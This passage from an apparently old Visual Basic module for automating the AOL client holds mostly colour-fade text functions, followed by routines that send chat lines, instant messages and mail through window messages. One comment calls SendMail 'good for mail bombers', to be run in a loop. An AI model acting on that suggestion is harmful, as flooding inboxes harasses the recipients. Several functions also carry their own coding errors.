        G = RGB(0, F - F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    DGreen_Black = msg
End Function



Function GreenBlack(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(0, 255 - F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    GreenBlack = msg
End Function
Function GreenBlackGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    GreenBlackGreen = msg
End Function

Function GreenBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(F, 255 - F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    GreenBlue = msg
End Function

Function GreenBlueGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    GreenBlueGreen = msg
End Function

Function GreenPurple(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(F, 255 - F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    GreenPurple = msg
End Function

Function GreenPurpleGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    GreenPurpleGreen = msg
End Function

Function GreenRed(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(0, 255 - F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    GreenRed = msg
End Function

Function GreenRedGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    GreenRedGreen = msg
End Function
Function GreenYellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(0, 255, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    GreenYellow = msg
End Function
Function GreenYellowGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    GreenYellowGreen = msg
End Function
Function GreyBlack(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 220 / a
        F = e * b
        G = RGB(255 - F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    GreyBlack = msg
End Function
Function GreyBlackGrey(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 490 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    GreyBlackGrey = msg
End Function

Function GreyBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255, 255, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    GreyBlue = msg
End Function

Function LBlue_DBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(355, 255 - F, 55)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    LBlue_DBlue = msg
End Function

Function LBlue_DBlue_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(355, 255 - F, 55)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    LBlue_DBlue_LBlue = msg
End Function

Function LBlue_Green(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255 - F, 255, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    LBlue_Green = msg
End Function
Function LBlue_Green_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    LBlue_Green_LBlue = msg
End Function

Function LBlue_Orange(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255 - F, 155, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    LBlue_Orange = msg
End Function



Function LBlue_Orange_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 155, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    LBlue_Orange_LBlue = msg
End Function

Function LBlue_Yellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255 - F, 255, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    LBlue_Yellow = msg
End Function
Function LBlue_Yellow_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    LBlue_Yellow_LBlue = msg
End Function

Function LGreen_DGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 220 / a
        F = e * b
        G = RGB(0, 375 - F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    LGreen_DGreen = msg
End Function

Function LGreen_DGreen_LGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 490 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 375 - F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    LGreen_DGreen_LGreen = msg
End Function

Function Purple_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255, F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    Purple_LBlue = msg
End Function

Function Purple_LBlue_Purple()
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    Purple_LBlue = msg
End Function

Function PurpleBlack(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255 - F, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    PurpleBlack = msg
End Function

Function PurpleBlackPurple(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    PurpleBlackPurple = msg
End Function
Function PurpleBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    PurpleBlue = msg
End Function

Function PurpleBluePurple(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    PurpleBluePurple = msg
End Function

Function PurpleGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255 - F, F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    PurpleGreen = msg
End Function
Function PurpleGreenPurple(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    PurpleGreenPurple = msg
End Function
Function PurpleRed(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255 - F, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    PurpleRed = msg
End Function
Function PurpleRedPurple(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    PurpleRedPurple = msg
End Function
Function PurpleYellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(255 - F, F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    PurpleYellow = msg
End Function

Function PurpleYellowPurple(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    PurpleYellowPurple = msg
End Function

Function RedBlack(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(0, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    RedBlack = msg
End Function

Function RedBlackRed(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    RedBlackRed = msg
End Function
Function RedBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(F, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    RedBlue = msg
End Function

Function RedBlueRed(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    RedBlueRed = msg
End Function
Function RedPurple(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(F, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    RedPurple = msg
End Function
Function RedPurpleRed(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    RedPurpleRed = msg
End Function

Function RedYellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(0, F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    RedYellow = msg
End Function

Function RedYellowRed(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    RedYellowRed = msg
End Function

Function Yellow_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(F, 255, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    Yellow_LBlue = msg
End Function
    
Function Yellow_LBlue_Yellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    Yellow_LBlue_Yellow = msg
End Function


Function YellowBlack(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(0, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    YellowBlack = msg
End Function
Function YellowBlackYellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    YellowBlackYellow = msg
End Function
Function YellowBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    YellowBlue = msg
End Function
Function YellowBlueYellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    YellowBlueYellow = msg
End Function
Function YellowGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(0, 255, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    YellowGreen = msg
End Function

Function YellowGreenYellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    YellowGreenYellow = msg
End Function
Function YellowPink(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(78, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    YellowPink = msg
End Function

Function YellowPinkYellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(78, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    YellowPink = msg
End Function

Function YellowPurple(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(F, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    YellowPurple = msg
End Function
Function YellowPurpleYellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    YellowPurpleYellow = msg
End Function
Function YellowRed(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / a
        F = e * b
        G = RGB(0, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    YellowRed = msg
End Function
Function YellowRedYellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / a
        F = e * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next b
    YellowRedYellow = msg
End Function



Sub Anti45MinTimer()
AOTimer% = FindWindow("_AOL_Palette", vbNullString)
AOIcon% = FindChildByClass(AOTimer%, "_AOL_Icon")
ClickIcon (AOIcon%)
End Sub
Sub AntiIdle()
AOModal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
End Sub

Sub CenterForm(F As Form)
'centers the form in the center of the screen
F.Top = (Screen.Height * 0.85) / 2 - F.Height / 2
F.Left = Screen.Width / 2 - F.Width / 2
End Sub

Sub ClickIcon(icon%)
Click% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
Click% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub
Function CoLoRChaTBlueBlack(thetext As String)
G$ = thetext
a = Len(G$)
For w = 1 To a Step 4
    r$ = Mid$(G$, w, 1)
    u$ = Mid$(G$, w + 1, 1)
    S$ = Mid$(G$, w + 2, 1)
    T$ = Mid$(G$, w + 3, 1)
    P$ = P$ & "<FONT COLOR=" & Chr$(34) & "#00F" & Chr$(34) & ">" & r$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#F0000" & Chr$(34) & ">" & S$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & T$
Next w
CoLoRChaT = P$
End Function
Sub EliteTalker(word$)
Made$ = ""
For Q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, Q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then Leet$ = "â"
    If X = 2 Then Leet$ = "å"
    If X = 3 Then Leet$ = "ä"
    End If
    If letter$ = "b" Then Leet$ = "b"
    If letter$ = "c" Then Leet$ = "ç"
    If letter$ = "d" Then Leet$ = "d"
    If letter$ = "e" Then
    If X = 1 Then Leet$ = "ë"
    If X = 2 Then Leet$ = "ê"
    If X = 3 Then Leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then Leet$ = "ì"
    If X = 2 Then Leet$ = "ï"
    If X = 3 Then Leet$ = "î"
    End If
    If letter$ = "j" Then Leet$ = ",j"
    If letter$ = "n" Then Leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then Leet$ = "ô"
    If X = 2 Then Leet$ = "ð"
    If X = 3 Then Leet$ = "õ"
    End If
    If letter$ = "s" Then Leet$ = "š"
    If letter$ = "t" Then Leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then Leet$ = "ù"
    If X = 2 Then Leet$ = "û"
    If X = 3 Then Leet$ = "ü"
    End If
    If letter$ = "w" Then Leet$ = "vv"
    If letter$ = "y" Then Leet$ = "ÿ"
    If letter$ = "0" Then Leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then Leet$ = "Å"
    If X = 2 Then Leet$ = "Ä"
    If X = 3 Then Leet$ = "Ã"
    End If
    If letter$ = "B" Then Leet$ = "ß"
    If letter$ = "C" Then Leet$ = "Ç"
    If letter$ = "D" Then Leet$ = "Ð"
    If letter$ = "E" Then Leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then Leet$ = "Ï"
    If X = 2 Then Leet$ = "Î"
    If X = 3 Then Leet$ = "Í"
    End If
    If letter$ = "N" Then Leet$ = "Ñ"
    If letter$ = "O" Then Leet$ = "Õ"
    If letter$ = "S" Then Leet$ = "Š"
    If letter$ = "U" Then Leet$ = "Û"
    If letter$ = "W" Then Leet$ = "VV"
    If letter$ = "Y" Then Leet$ = "Ý"
    If letter$ = "`" Then Leet$ = "´"
    If letter$ = "!" Then Leet$ = "¡"
    If letter$ = "?" Then Leet$ = "¿"
    If Len(Leet$) = 0 Then Leet$ = letter$
    Made$ = Made$ & Leet$
Next Q
SendChat (Made$)
End Sub

'minimizes aol. SIMPLE enough
Sub HideAOL()
Aol% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(Aol%, 0)
End Sub
Sub IMBuddy(Recipiant, Message)

Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")
buddy% = FindChildByTitle(MDI%, "Buddy List Window")

If buddy% = 0 Then
    KeyWord ("BuddyView")
    Do: DoEvents
    Loop Until buddy% <> 0
End If
End Sub
Sub IMIgnore(thelist As ListBox)
Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")
im% = FindChildByTitle(MDI%, ">Instant Message From:")
If im% <> 0 Then
    For findsn = 0 To thelist.ListCount
        If LCase$(thelist.List(findsn)) = LCase$(SNfromIM) Then
            BadIM% = im%
            IMRICH% = FindChildByClass(BadIM%, "RICHCNTL")
            Call SendMessage(IMRICH%, WM_CLOSE, 0, 0)
            Call SendMessage(BadIM%, WM_CLOSE, 0, 0)
        End If
    Next findsn
End If
End Sub
Sub IMKeyword(Recipiant, Message)

Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")

Call KeyWord("aol://9293:")

Do: DoEvents
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
AOEdit% = FindChildByClass(IMWin%, "_AOL_Edit")
AORich% = FindChildByClass(IMWin%, "RICHCNTL")
AOIcon% = FindChildByClass(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Message)

For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X

Call TimeOut(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop

End Sub
Sub IMsOff()
Call IMKeyword("$IM_OFF", " ")
End Sub


Sub IMsOn()
Call IMKeyword("$IM_ON", " ")
End Sub

Sub KeyWord(TheKeyWord As String)
Aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(Aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")

AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

For GetIcon = 1 To 20
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

Call TimeOut(0.05)
ClickIcon (AOIcon%)

Do: DoEvents
MDI% = FindChildByClass(Aol%, "MDIClient")
KeyWordWin% = FindChildByTitle(MDI%, "Keyword")
AOEdit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0

Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, TheKeyWord)

Call TimeOut(0.05)
ClickIcon (AOIcon2%)
ClickIcon (AOIcon2%)

End Sub
Sub KillWait()

Aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(Aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")

AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

For GetIcon = 1 To 19
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

Call TimeOut(0.05)
ClickIcon (AOIcon%)

Do: DoEvents
MDI% = FindChildByClass(Aol%, "MDIClient")
KeyWordWin% = FindChildByTitle(MDI%, "Keyword")
AOEdit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0

Call SendMessage(KeyWordWin%, WM_CLOSE, 0, 0)
End Sub
Function LastChatLine()
chattext = LastChatLineWithSN
ChatTrimNum = Len(SNFromLastChatLine)
ChatTrim$ = Mid$(chattext, ChatTrimNum + 4, Len(chattext) - Len(SNFromLastChatLine))
LastChatLine = ChatTrim$
End Function


Function LastChatLineWithSN()
chattext$ = GetchatText

For FindChar = 1 To Len(chattext$)

thechar$ = Mid(chattext$, FindChar, 1)
thechars$ = thechars$ & thechar$

If thechar$ = Chr(13) Then
TheChatText$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If

Next FindChar

lastlen = Val(FindChar) - Len(thechars$)
lastline = Mid(chattext$, lastlen, Len(thechars$))

LastChatLineWithSN = lastline
End Function
Sub LocateMember(theSN As String)
Call KeyWord("aol://3548:" & theSN)
End Sub

Function MessageFromIM()
Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")

im% = FindChildByTitle(MDI%, ">Instant Message From:")
If im% Then GoTo Greed
im% = FindChildByTitle(MDI%, "  Instant Message From:")
If im% Then GoTo Greed
Exit Function
Greed:
imtext% = FindChildByClass(im%, "RICHCNTL")
IMmessage = GetText(imtext%)
SN = SNfromIM()
snlen = Len(SNfromIM()) + 3
Blah = Mid(IMmessage, InStr(IMmessagge, SN) + snlen)
MessageFromIM = Left(Blah, Len(Blah) - 1)
End Function


Sub Playwav(File)
SoundName$ = File
   wFlags% = SND_ASYNC Or SND_NODEFAULT
   X% = sndPlaySound(SoundName$, wFlags%)

End Sub
Sub SendChat(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")

AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
'Good for mail bombers. just loop it
Sub SendMail(Recipiants, Subject, Message)

Aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(Aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
